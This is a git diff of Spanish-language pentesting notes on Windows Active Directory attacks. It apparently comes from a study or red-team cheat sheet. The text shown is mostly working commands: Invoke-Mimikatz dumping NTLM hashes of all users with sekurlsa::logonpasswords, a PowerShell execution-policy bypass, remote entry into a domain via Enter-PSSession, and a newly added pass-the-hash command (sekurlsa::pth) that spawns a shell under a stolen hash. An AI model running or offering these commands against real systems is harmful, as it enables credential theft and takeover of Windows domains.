@@ -30,6 +30,8 @@ Los atacantes obtienen fácilmente las credenciales hasheadas para loas ataques 
 		❯ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' # Nos muestra el hash NTLM de todos los usuarios asi como el del 'Admin' 
 ```
 
+## Mimikatz
+
 ```powershell
 # Abrimos una nueva consola de Poweshell como 'Admin'
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
@@ -41,4 +43,11 @@ Los atacantes obtienen fácilmente las credenciales hasheadas para loas ataques 
 
 # Despliega una nueva venta en Powershell
 ❯ Enter-PSSession prod.research.domian.local # Ingresamos al 'DOMINIO' via remota como el usuario Admin
+```
+
+```powershell
+❯ Invoke-mimikatz -Command '"sekurlsa::pth /user:user /domain:domain1.corp /rc4:hash /run:powershell.exe"'
+
+	# rc4 = El hash NTLM del usuario encontrado con el comando 'DumpCreds'
+	# sekurlsa = Pass-The-Hash
 ```
